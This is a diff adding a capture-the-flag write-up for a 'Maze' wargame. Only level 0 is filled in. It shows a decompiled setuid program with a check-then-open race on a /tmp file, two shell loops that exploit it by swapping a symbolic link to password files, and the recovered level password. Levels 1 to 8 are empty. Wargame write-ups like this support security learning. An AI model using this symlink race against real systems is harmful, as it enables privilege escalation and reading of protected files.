@@ -1,0 +1,105 @@
+################################################ Maze #############################################
+
+Level:     0
+Exploit:   Race Condition
+Password:  kfL7RRfpkY
+
+Exploit mitigations: NX, stack canaries
+
+ghidra decompile:
+  int main(int argc,char **argv) {
+    int iVar1;
+    int iVar2;
+    __uid_t __suid;
+    __uid_t __euid;
+    __uid_t __ruid;
+    int in_GS_OFFSET;
+    char **argv_local;
+    int fd;
+    char buf [20];
+  
+    iVar1 = *(int *)(in_GS_OFFSET + 0x14);
+    memset(buf,0,0x14);
+    iVar2 = access("/tmp/128ecf542a35ac5270a87dc740918404",4);   <-- attempts to access file
+    if (iVar2 == 0) {
+      __suid = geteuid();
+      __euid = geteuid();
+      __ruid = geteuid();
+      setresuid(__ruid,__euid,__suid);
+      iVar2 = open("/tmp/128ecf542a35ac5270a87dc740918404",0);   <-- attempts to open file
+      if (iVar2 < 0) {
+        /* WARNING: Subroutine does not return */
+        exit(-1);
+      }
+      read(iVar2,buf,0x13);                                      <-- read 0x13 bytes into buf
+      write(1,buf,0x13);                                         <-- write buf to stdout
+    }
+    if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
+      /* WARNING: Subroutine does not return */
+      __stack_chk_fail(argv);
+    }
+    return 
+}  
+
+The program first checks if the file is accessible. Then it escalates its priviledges. It then 
+attempts to open the file and read from it.
+We must first provide a file with appropriate access and then swap it to a symbolic link to the 
+password.
+
+To simulate the race condition, we can open 2 processes, one for constantly running maze0, and
+another for swapping the file between ownership of maze0 & maze1
+
+$ while [ 1 ]; do /maze/maz0; done
+$ while [ 1 ]; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404;
+  ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done 
+
+###################################################################################################
+
+Level:     1
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     2
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     3
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     4
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     5
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     6
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     7
+Exploit:   
+Password:  
+
+###################################################################################################
+
+Level:     8
+Exploit:   
+Password:  
+
+###################################################################################################
+
